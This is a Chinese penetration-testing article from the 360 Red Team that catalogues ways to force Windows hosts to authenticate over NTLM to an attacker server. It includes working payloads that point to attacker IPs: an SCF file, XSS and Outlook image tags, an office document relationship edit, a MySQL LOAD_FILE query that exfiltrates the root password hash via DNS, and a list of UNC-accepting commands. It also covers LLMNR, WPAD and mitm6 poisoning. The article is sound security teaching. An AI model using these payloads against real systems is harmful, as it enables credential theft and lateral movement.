@@ -1,0 +1,617 @@
+# Windows内网协议学习NTLM篇之发起NTLM请求
+
+阅读量 **1413437**
+
+|评论 **2**
+
+发布时间 : 2019-11-25 10:30:24
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01da0b6cd153e1bc69.jpg)
+
+作者：daiker@360RedTeam
+
+## 0x00 前言
+
+这篇文章是ntlm篇的第二篇，怎么发起ntlm请求。在 阅读这篇文章之前，有两点说明
+
+  1. 这篇文章的主要内容是使服务器向攻击者发起ntlm 请求，但是没有进一步利用，因此本篇文件的表述都是获得net-ntlm hash。使用Responder来捕获。Responder的用法可自行搜索。这里不展开。
+  2. 有些地方较为敏感，因此使用的net-ntlm hash的截图并非真实图片。这个地方不重要，主要证明能发起请求就行，出现net-ntlm hash 截图的地方都是本地测试，真实收到请求的。
+
+## 0x01 图标
+
+###  1.desktop.ini
+
+文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到
+
+![](https://p0.ssl.qhimg.com/t0144f665ae112eae74.png)
+
+![](https://p4.ssl.qhimg.com/t0165ba85c4d634f01f.png)
+
+每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了。
+
+![](https://p4.ssl.qhimg.com/t0109242aed70c8edbf.png)
+
+将图标路径改成UNC路径，指向我们的服务器
+
+![](https://p3.ssl.qhimg.com/t01cd9feec551e6c9c8.png)
+
+![](https://p1.ssl.qhimg.com/t012ac665661477db24.png)
+
+当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。
+
+![](https://p4.ssl.qhimg.com/t018c0abc5626297a6a.png)
+
+###  2\. scf 文件
+
+只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式
+
+    
+    
+    [Shell]
+    Command=2
+    IconFile=\\172.16.100.1\scf\test.ico
+    [Taskbar]
+    Command=ToggleDesktop
+
+新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。
+
+![](https://p3.ssl.qhimg.com/t019484b513c20d1abf.png)
+
+###  3.用户头像
+
+适用于Windows 10/2016/2019
+
+在更改账户图片处。
+
+![](https://p2.ssl.qhimg.com/t01b057d44989093b9c.png)
+
+用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲。
+
+## 0x02 系统命令携带UNC路径
+
+这个比较鸡肋，都能执行命令了，干啥不行呢。但作为一种场景，也说明下。说不定有些限制的命令注入就是支持传进UNC路径呢。我平时在测试的时候一般都是用 dir
+\\\ip\xxx来做测试的，很多cmd命令是支持传进UNC路径的，执行的时候我们就可以拿到用户的net-ntlm
+hash了。至于有哪些命令。这篇文章总结了一些命令,总结得挺全面的。
+[内网渗透——针对hash的攻击](https://www.anquanke.com/post/id/177123)
+
+    
+    
+    > net.exe use \hostshare 
+    > attrib.exe \hostshare  
+    > bcdboot.exe \hostshare  
+    > bdeunlock.exe \hostshare  
+    > cacls.exe \hostshare  
+    > certreq.exe \hostshare #(noisy, pops an error dialog) 
+    > certutil.exe \hostshare  
+    > cipher.exe \hostshare  
+    > ClipUp.exe -l \hostshare  
+    > cmdl32.exe \hostshare  
+    > cmstp.exe /s \hostshare  
+    > colorcpl.exe \hostshare #(noisy, pops an error dialog)  
+    > comp.exe /N=0 \hostshare \hostshare  
+    > compact.exe \hostshare  
+    > control.exe \hostshare  
+    > convertvhd.exe -source \hostshare -destination \hostshare  
+    > Defrag.exe \hostshare  
+    > diskperf.exe \hostshare  
+    > dispdiag.exe -out \hostshare  
+    > doskey.exe /MACROFILE=\hostshare  
+    > esentutl.exe /k \hostshare  
+    > expand.exe \hostshare  
+    > extrac32.exe \hostshare  
+    > FileHistory.exe \hostshare #(noisy, pops a gui)  
+    > findstr.exe * \hostshare  
+    > fontview.exe \hostshare #(noisy, pops an error dialog)  
+    > fvenotify.exe \hostshare #(noisy, pops an access denied error)  
+    > FXSCOVER.exe \hostshare #(noisy, pops GUI)  
+    > hwrcomp.exe -check \hostshare  
+    > hwrreg.exe \hostshare  
+    > icacls.exe \hostshare   
+    > licensingdiag.exe -cab \hostshare  
+    > lodctr.exe \hostshare  
+    > lpksetup.exe /p \hostshare /s  
+    > makecab.exe \hostshare  
+    > msiexec.exe /update \hostshare /quiet  
+    > msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)  
+    > mspaint.exe \hostshare #(noisy, invalid path to png error)  
+    > msra.exe /openfile \hostshare #(noisy, error)  
+    > mstsc.exe \hostshare #(noisy, error)  
+    > netcfg.exe -l \hostshare -c p -i foo
+
+## 0x03 XSS
+
+利用xss构造
+
+    
+    
+    <script src="\\172.16.100.1\xss">
+
+![](https://p0.ssl.qhimg.com/t014844a20643027040.png)
+
+这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例
+
+![](https://p4.ssl.qhimg.com/t01bb0e32bea02a3c17.png)
+
+我们接下来尝试不通过UNC路径，就xss里面访问http请求来发起认证
+
+把payload 改成
+
+    
+    
+    <script src="//172.16.100.1/x">
+
+看到跳出认证框，我们也没抓到net-ntlm hash
+
+![](https://p4.ssl.qhimg.com/t01cf8f95ff7f57165a.png)
+
+不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。
+
+![](https://p5.ssl.qhimg.com/t01affee892e327511e.png)
+
+当我们选择自动使用当前用户名和密码登录就能拿到用户的net-ntlm hash
+
+![](https://p5.ssl.qhimg.com/t0114b499c3c0d7c704.png)
+
+就可以抓到用户net-ntlm hash了
+
+![](https://p0.ssl.qhimg.com/t017b79dbf66af8906b.png)
+
+修改后的配置同样适用于chrome
+
+那至今为止，在默认的配置情况底下，如果有xss，那构造的页面的效果有两种
+
+  1. 构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行
+
+    
+    
+    <script src="\\172.16.100.1\xss">
+
+  2. 构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码。
+
+    
+    
+    <script src="//172.16.100.1\xss">
+
+第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。
+
+在查看DNS的ACL的时候，我发现了一条规则
+
+![](https://p1.ssl.qhimg.com/t0137624c7c66a7f656.png)
+
+认证用户都可以在DNS里面创建子对象，也就意味着如果我们是域内认证
+用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记录
+
+![](https://p5.ssl.qhimg.com/t0146afd6aacc538e01.png)
+
+然后将我们的payload 换成
+
+    
+    
+    <script  src="//xss\xss"></script>
+
+由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash。
+
+![](https://p5.ssl.qhimg.com/t0125428557ea58b956.png)
+
+## 0x04 outlook
+
+发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload
+
+    
+    
+    <img src="\\172.16.100.1\outlook">
+
+![](https://p3.ssl.qhimg.com/t01449fa60a0c7ace80.png)
+
+当收件人打开outlook查看邮件的时候
+
+![](https://p2.ssl.qhimg.com/t017faacc2e63c275c2.png)
+
+我们就收到net-ntlm hash了
+
+![](https://p4.ssl.qhimg.com/t017e649a3f37a88ab4.png)
+
+## 0x05 PDF
+
+PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用三好学生的脚本<https://github.com/3gstudent/Worse-PDF>
+
+![](https://p0.ssl.qhimg.com/t017e3f40136d5dba22.png)
+
+我们就收到net-ntlm hash
+
+![](https://p0.ssl.qhimg.com/t0185c13b447ec5ac48.png)
+
+用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。
+
+在实际测试中使用Adobe
+
+![](https://p4.ssl.qhimg.com/t01d76ec654fd5e4c70.png)
+
+发现会有提示
+
+![](https://p0.ssl.qhimg.com/t01f6ea22f436c995de.png)
+
+## 0x06 office
+
+首先新建一个word，贴近一张图片
+
+![](https://p0.ssl.qhimg.com/t01fa0478d99d0abbbd.png)
+
+然后用7zip 打开(没测试其他软件，可自行测试)
+
+进入word\\_rels，修改document.xml.rels
+
+![](https://p3.ssl.qhimg.com/t01d76fbdeb92ee1dcb.png)
+
+可以看到Target参数本来是本地的路径
+
+![](https://p4.ssl.qhimg.com/t0150e905aa944df1e2.png)
+
+修改为UNC路径，然后加上TargetMode=”External”
+
+![](https://p3.ssl.qhimg.com/t01759cb25553580ccb.png)
+
+当打开word的时候,我们就拿到net-ntlm hash
+
+![](https://p5.ssl.qhimg.com/t0168db46acb78f1a7c.png)
+
+## 0x07 MySQL
+
+我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。
+
+    
+    
+    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
+
+需要具备loadfile权限，且没有securefile_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)
+
+仔细观察我们会发现LOAD_FILE是支持UNC路劲
+
+我们构造
+
+    
+    
+    select load_file('\\\\172.16.100.1\\mysql');
+
+拿到net-ntlm hash
+
+![](https://p0.ssl.qhimg.com/t015eb4b2ce5a039b2e.png)
+
+## 0x08 NBNS和LLMNR
+
+windows 解析域名的顺序是
+
+  * Hosts
+  * DNS (cache / server)
+  * LLMNR
+  * NBNS
+
+如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析
+
+###  1\. LLMNR
+
+LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播
+DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4
+的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。
+
+LLMNR 进行名称解析的过程为：
+
+  * 检查本地 NetBIOS 缓存
+  * 如果缓存中没有则会像当前子网域发送广播
+  * 当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败
+
+也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。
+
+当受害者访问一个不存在的域名的时候。比如 hhhhhhhhhhhhhhhhhhhh
+
+![](https://p5.ssl.qhimg.com/t01ef558fc0d28a906b.png)
+
+受害者在Hosts 文件里面没有找到，通过DNS解析失败。就会通过LLMNR协议进行广播。
+
+![](https://p5.ssl.qhimg.com/t01924ea460c8205a59.png)
+
+这个时候攻击者就发个响应包 hhhhhhhhhhhhhhhhhhhh对应的IP是x.x.x.x(这个ip是攻击者IP)进行LLMNR投毒。
+
+![](https://p4.ssl.qhimg.com/t0143c1d46dd47ec5e5.png)
+
+这一步可以通过Responder 实现。
+
+![](https://p5.ssl.qhimg.com/t01bf82813b01b34261.png)
+
+![](https://p0.ssl.qhimg.com/t014a94e0e9a323ea24.png)
+
+这个时候hhhhhhhhhhhhhhhhhhhh映射的ip就是攻击者的IP，当受害者访问hhhhhhhhhhhhhhhhhhhh就会访问攻击者的IP，攻击者就能拿到net-ntlm hash.
+
+![](https://p4.ssl.qhimg.com/t016e15223d3215d0e4.png)
+
+###  2\. NBNS
+
+全称是NetBIOS Name Service。
+
+NetBIOS 协议进行名称解析的过程如下：
+
+  * 检查本地 NetBIOS 缓存
+  * 如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求
+  * 如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
+  * 如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件
+
+lmhosts 文件位于C:\Windows\System32\drivers\etc\目录中。
+
+NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS
+服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。
+
+![](https://p1.ssl.qhimg.com/t01b35afe86d4ec6825.png)
+
+## 0x09 WPAD和mitm6
+
+wpad 全称是Web Proxy Auto-Discovery Protocol
+，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。
+
+![](https://p1.ssl.qhimg.com/t011c1c4589c1855efb.png)
+
+默认自动检测设置是开启的。
+
+PAC文件的格式如下
+
+    
+    
+    function FindProxyForURL(url, host) {
+    if (url== 'http://www.baidu.com/') return 'DIRECT';
+    if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';
+    if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';
+    return 'DIRECT';
+    }
+
+WPAD的一般请求流程是(图片来源乌云drop)
+
+![](https://p3.ssl.qhimg.com/t01f180c2a768c0d26f.png)
+
+用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。
+
+查询PAC文件的顺序如下：
+
+1.通过DHCP服务器
+
+2.查询WPAD主机的IP
+
+  * Hosts
+  * DNS (cache / server)
+  * LLMNR
+  * NBNS
+
+这个地方就涉及到两种攻击方式
+
+###  1\. 配合LLMNR/NBNS投毒
+
+这是最早的攻击方式。用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD/wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。Responder可以很方便得实现。
+
+受害者通过llmnr询问wpad主机在哪里，Responder通过llmnr投毒将wpad的ip指向Responder所在的服务器
+
+![](https://p0.ssl.qhimg.com/t01b20b0ce4df614a8a.png)
+
+![](https://p4.ssl.qhimg.com/t01f21b0927e4e75146.png)
+
+![](https://p4.ssl.qhimg.com/t0146948b7f923588f0.png)
+
+受害者访问WPAD/wpad.dat，Responder就能获取到用户的net-ntlm
+hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上-F 开启)
+
+![](https://p2.ssl.qhimg.com/t01aa3ea561d58bb580.png)
+
+然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141。
+
+    
+    
+    function FindProxyForURL(url, host){
+      if ((host == "localhost") 
+          || shExpMatch(host, "localhost.*") 
+          ||(host == "127.0.0.1") 
+          || isPlainHostName(host)) return "DIRECT"; 
+      if (dnsDomainIs(host, "RespProxySrv")
+          ||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) 
+        			return "DIRECT"; 
+      return 'PROXY ISAProxySrv:3141; DIRECT';}
+    
+
+受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss
+payload获取net-ntlm
+hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。这里就不详细展开了。
+
+![](https://p0.ssl.qhimg.com/t01c1bec58a61453777.png)
+
+![](https://p4.ssl.qhimg.com/t01ccc27988b655debf.png)
+
+![](https://p1.ssl.qhimg.com/t01a8410935cc96e677.png)
+
+![](https://p5.ssl.qhimg.com/t01bbf5f716e0e60852.png)
+
+然而，微软在2016年发布了[MS16-077](https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016)安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：
+
+1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。
+
+2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。
+
+###  2\. 配合DHCPv6
+
+前面说过，针对在查询WPAD的时候进行投毒欺骗这种攻击方式，微软添加了两个重要的保护措施
+
+1.系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。
+
+2.更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。
+
+第二个保护措施比较好绕过，我们先来绕过这个。更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。这个其实比较好解决，在访问pac文件的时候，我们没办法获取到用户的net-ntlm hash。其实默认responder就不想在这一步获取net-ntlm hash，他默认不开启，要手动加-F选项才能开启。我们可以给用户返回一个正常的wpad。将代理指向我们自己，然后我们作为中间人。这个时候可以做的事就很多了。比如插入xss
+payload获取net-ntlm
+hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等。这个可以回去上一小节配合LLMNR/NBNS投毒看看。
+
+在网上也有一种比较巧妙的绕过姿势。我们可以给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP
+CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP
+407错误（需要代理身份验证），这与401不同，IE/Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。
+
+所以我们接下来的任务是要来绕过第一个保护措施
+
+系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。
+
+这个就保证了llmnr投毒和nbns投毒不能用了。我们来回顾下用户获取pac文件的一般流程。
+
+  1. 通过DHCP服务器
+  2. 查询WPAD主机的IP
+
+  *     * Hosts
+    * DNS (cache / server)
+    * LLMNR
+    * NBNS
+
+在[MS16-077](https://support.microsoft.com/en-us/help/3165191/ms16-077-security-update-for-wpad-june-14--2016)之后，通过DHCP和DNS协议还可以获取到pac文件。
+
+DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。
+
+幸运的是安全研究人员并不将目光局限在ipv4，从Windows
+Vista以来，所有的Windows系统（包括服务器版系统）都会启用IPv6网络，并且其优先级要高于IPv4网络。这里我们要用到DHCPV6协议。
+
+DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，DHCP服务器或中继代理回应Advertise消息告知客户端。客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。通俗点来说就是，在可以使用ipv6的情况(Windows
+Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。
+
+Fox-IT公布了名为[mitm6](https://github.com/fox-it/mitm6.git)的一个工具，可以实施这种攻击。
+
+mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。
+
+![](https://p1.ssl.qhimg.com/t01041c8705ec27ab5f.png)
+
+![](https://p0.ssl.qhimg.com/t018fff5368133b0ad2.png)
+
+当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置
+
+![](https://p4.ssl.qhimg.com/t01c6f785534b413972.png)
+
+这个时候mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6
+DNS服务器。应当注意，mitm6当前仅针对基于Windows的操作系统，因为其他操作系统（如macOS和Linux）不使用DHCPv6进行DNS服务器分配。
+
+![](https://p4.ssl.qhimg.com/t01f8bc1185adbfc1cf.png)
+
+这个时候受害者的dns 服务器的地址已经设置为攻击者的IPv6地址。一旦受害机器将攻击者设置为IPv6
+DNS服务器，它将立即开始查询网络的WPAD配置。由于这些DNS查询是发送给攻击者的，因此攻击者仅可以使用自己的IP地址作为WPAD对应的IP地址。
+
+![](https://p1.ssl.qhimg.com/t0154a21107adf06f7d.png)
+
+至此MS16-077的两个保护措施都能绕过，再遇到MS16-077之后的机子不妨试试这种方法。
+
+## 0x0A XXE && SSRF
+
+###  1\. XXE
+
+在xxe里面加载外部文件的时候，如果路径支持unc路径的话，是能拿到net-ntlm hash的。
+
+这里使用javajavax.xml.parsers进行测试,测试代码如下
+
+    
+    
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder db = dbf.newDocumentBuilder();
+    Document doc = db.parse(request.getInputStream());
+
+![](https://p2.ssl.qhimg.com/t01ac62cbf27b573d3e.png)
+
+成功打回net-ntlm hash
+
+![](https://p1.ssl.qhimg.com/t01b7240de70ccc231f.png)
+
+如果不支持UNC，可再测试http协议。
+
+![](https://p3.ssl.qhimg.com/t01fba81af78037c1e2.png)
+
+成功打回net-ntlm hash。
+
+###  2\. SSRF
+
+在ssrf里面如果支持file协议，并且file协议能加载远程资源的话，是能拿到net-ntlm hash的。
+
+这里使用JAVA的HttpURLConnection进行测试，测试代码如下
+
+    
+    
+    URL u = new URL(url);
+    URLConnection urlConnection = u.openConnection();
+    HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;
+    BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream()));
+
+当只支持HTTP协议的时候，也是可能打回net-ntlm hash的。
+
+成功打回net-ntlm hash
+
+各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，这里并没有一一测试。
+
+只要支持UNC路径都能打回net-ntlm
+hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面，但是判断是否在信任域的代码是这样。
+
+    
+    
+    static class DefaultNTLMAuthenticationCallback extends NTLMAuthenticationCallback {
+    @Override
+    public boolean isTrustedSite(URL url) { return true; }
+    }
+
+在xxe和ssrf测试中一般要测试这两个方面
+
+  1. 支不支持UNC路径，比如\\\ip\x或者file://ip/x
+  2. 支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的
+
+各个语言，各个模块的测试，这里并没有一一测试。
+
+## 0x0B 打印机漏洞
+
+Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。
+
+任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。
+
+如下图，使用printerbug.py对172.16.100.5发起请求，172.16.100.5就会向172.16.100.1发起ntlm 请求。
+
+![](https://p0.ssl.qhimg.com/t01cabaea74d3f04661.png)
+
+![](https://p1.ssl.qhimg.com/t010411938f786e29bc.png)
+
+## 0x0C 引用文章
+
+  * [渗透技巧——利用PDF文件获取Net-NTLM hash](%5bhttps:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash/%5d\(https:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash/\))
+  * [利用图标文件获取连接文件服务器的NTLMv2 Hash](%5bhttps:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/%5d\(https:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/\))
+  * [Microsoft Word – UNC Path Injection with Image Linking](https://blog.netspi.com/microsoft-word-unc-path-injection-image-linking/)
+  * [基于WPAD的中间人攻击](%5bhttps:/wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html%5d\(https:/wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html\))
+  * [mitm6 – compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **360灵腾安全实验室** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/193493](/post/id/193493)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [渗透测试](/tag/渗透测试)
+  * [域安全](/tag/域安全)
+
+ **+1** __18赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t01fae47a70f20e70ec.png) 360灵腾安全实验室
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
